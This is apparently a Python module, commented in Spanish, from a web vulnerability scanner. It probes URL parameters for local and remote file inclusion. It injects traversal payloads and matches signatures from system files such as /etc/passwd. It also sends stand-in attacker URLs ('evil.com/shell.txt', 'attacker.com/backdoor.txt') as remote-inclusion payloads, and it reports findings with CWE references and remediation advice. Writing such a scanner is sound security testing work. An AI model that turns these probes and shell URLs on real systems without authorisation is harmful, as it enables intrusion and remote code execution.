"""
Módulo de detección de LFI/RFI (Local/Remote File Inclusion).
Detecta vulnerabilidades de inclusión de archivos locales y remotos.
CVSS: 9.1 (Critical para RFI), 7.5 (High para LFI)
"""
from core.enhanced_base_module import EnhancedVulnerabilityModule
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


class LFIModule(EnhancedVulnerabilityModule):
    """Módulo para detectar vulnerabilidades de LFI/RFI."""
    
    def __init__(self, config):
        super().__init__(config)
        # HTTPClient, PayloadManager, logger ya disponibles
        
        # Cargar payloads desde PayloadManager
        self.payloads = self._load_payloads('lfi', max_count=15)
        
        # Signatures para detectar LFI exitoso
        self.lfi_signatures = {
            'linux': [
                'root:x:0:0:',
                'daemon:',
                '/bin/bash',
                '/bin/sh'
            ],
            'windows': [
                '[extensions]',
                '; for 16-bit app support',
                '[fonts]',
                '[mail]'
            ]
        }
        
        # Payloads RFI
        self.rfi_payloads = [
            'http://evil.com/shell.txt',
            'https://attacker.com/backdoor.txt',
            '//evil.com/shell.txt'
        ]
    
    def scan(self):
        """Detecta vulnerabilidades de LFI/RFI."""
        self.logger.info("=== Iniciando escaneo LFI/RFI ===")
        
        try:
            # 1. Descubrir puntos de inyección (método heredado con filtro)
            lfi_keywords = ['file', 'path', 'page', 'include', 'doc', 'document', 
                           'folder', 'root', 'pg', 'style', 'pdf', 'template']
            injection_points = self._discover_injection_points(keywords=lfi_keywords)
            
            if not injection_points:
                self.logger.info("No se encontraron puntos de inyección para LFI/RFI")
                return
            
            # 2. Probar LFI (Local File Inclusion)
            self._test_lfi(injection_points)
            
            # 3. Probar RFI (Remote File Inclusion)
            self._test_rfi(injection_points)
            
            # 4. Exportar resultados (método heredado)
            self._export_results()
            
            self.logger.info(f"Escaneo LFI/RFI completado: {len(self.findings)} hallazgos")
            
        except Exception as e:
            self.logger.error(f"Error en escaneo LFI/RFI: {e}")
    
    def _test_lfi(self, injection_points):
        """Prueba Local File Inclusion."""
        self.logger.info("Probando LFI (Local File Inclusion)...")
        
        for point in injection_points:
            param = point['parameter']
            base_url = point['url']
            
            # Evitar duplicados
            test_key = f"{base_url}:{param}"
            if test_key in self.tested_params:
                continue
            self.tested_params.add(test_key)
            
            for payload in self.payloads:
                try:
                    # Construir URL con payload
                    parsed = urlparse(base_url)
                    params = parse_qs(parsed.query)
                    params[param] = [payload]
                    
                    new_query = urlencode(params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))
                    
                    # Hacer request (método heredado)
                    response = self._make_request(test_url)
                    
                    if not response:
                        continue
                    
                    # Verificar si el payload fue exitoso
                    if self._is_lfi_vulnerable(response.text, payload):
                        # Añadir hallazgo (método heredado)
                        self._add_finding(
                            vulnerability="LFI - Local File Inclusion",
                            severity="high",
                            url=test_url,
                            payload=payload,
                            details={
                                "injection_point": param,
                                "payload_used": payload,
                                "evidence": self._get_evidence(response.text),
                                "cvss": 7.5,
                                "cwe": "CWE-98",
                                "recommendation": "Validar y sanitizar todos los inputs de archivo. Usar whitelist de archivos permitidos. Evitar incluir archivos basados en input del usuario.",
                                "references": [
                                    "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
                                    "https://cwe.mitre.org/data/definitions/98.html"
                                ]
                            }
                        )
                        
                        self.logger.warning(f"LFI detectado: {param} con payload {payload}")
                        break  # Solo reportar una vez por parámetro
                
                except Exception as e:
                    self.logger.debug(f"Error probando LFI: {e}")
    
    def _test_rfi(self, injection_points):
        """Prueba Remote File Inclusion."""
        self.logger.info("Probando RFI (Remote File Inclusion)...")
        
        for point in injection_points:
            param = point['parameter']
            base_url = point['url']
            
            # Evitar duplicados
            test_key = f"{base_url}:{param}:rfi"
            if test_key in self.tested_params:
                continue
            self.tested_params.add(test_key)
            
            for payload in self.rfi_payloads:
                try:
                    # Construir URL con payload RFI
                    parsed = urlparse(base_url)
                    params = parse_qs(parsed.query)
                    params[param] = [payload]
                    
                    new_query = urlencode(params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))
                    
                    # Hacer request (método heredado)
                    response = self._make_request(test_url)
                    
                    if not response:
                        continue
                    
                    # Verificar si intenta hacer request externo
                    if self._is_rfi_vulnerable(response, payload):
                        # Añadir hallazgo (método heredado)
                        self._add_finding(
                            vulnerability="RFI - Remote File Inclusion",
                            severity="critical",
                            url=test_url,
                            payload=payload,
                            details={
                                "injection_point": param,
                                "payload_used": payload,
                                "risk": "Permite ejecución remota de código arbitrario",
                                "cvss": 9.1,
                                "cwe": "CWE-98",
                                "recommendation": "CRÍTICO: Deshabilitar allow_url_include en PHP. Validar estrictamente todos los inputs. Usar whitelist de archivos locales únicamente.",
                                "references": [
                                    "https://owasp.org/www-community/attacks/Remote_File_Inclusion",
                                    "https://cwe.mitre.org/data/definitions/98.html"
                                ]
                            }
                        )
                        
                        self.logger.critical(f"RFI detectado: {param} con payload {payload}")
                        break
                
                except Exception as e:
                    self.logger.debug(f"Error probando RFI: {e}")
    
    def _is_lfi_vulnerable(self, response_text, payload):
        """Verifica si la respuesta indica LFI exitoso."""
        # Detectar signatures de archivos del sistema
        for os_type, signatures in self.lfi_signatures.items():
            for signature in signatures:
                if signature in response_text:
                    return True
        
        # Detectar path traversal exitoso
        if '../' in payload or '..\\'  in payload:
            if 'root:' in response_text or '[extensions]' in response_text:
                return True
        
        return False
    
    def _is_rfi_vulnerable(self, response, payload):
        """Verifica si la respuesta indica RFI exitoso."""
        # En un escenario real, verificarías si tu servidor recibió la petición
        # Por ahora, detectamos indicadores básicos
        
        # Si el servidor intenta resolver el dominio externo
        if response.status_code == 200:
            # Buscar errores de conexión externa
            error_indicators = [
                'failed to open stream',
                'Connection refused',
                'Unable to find',
                'getaddrinfo failed'
            ]
            
            for indicator in error_indicators:
                if indicator in response.text:
                    return True
        
        return False
    
    def _get_evidence(self, response_text):
        """Extrae evidencia de LFI exitoso."""
        evidence = []
        
        for os_type, signatures in self.lfi_signatures.items():
            for signature in signatures:
                if signature in response_text:
                    # Extraer contexto (método heredado)
                    snippet = self._get_context_snippet(response_text, signature)
                    evidence.append(snippet)
                    break
        
        return evidence[:3]  # Máximo 3 evidencias
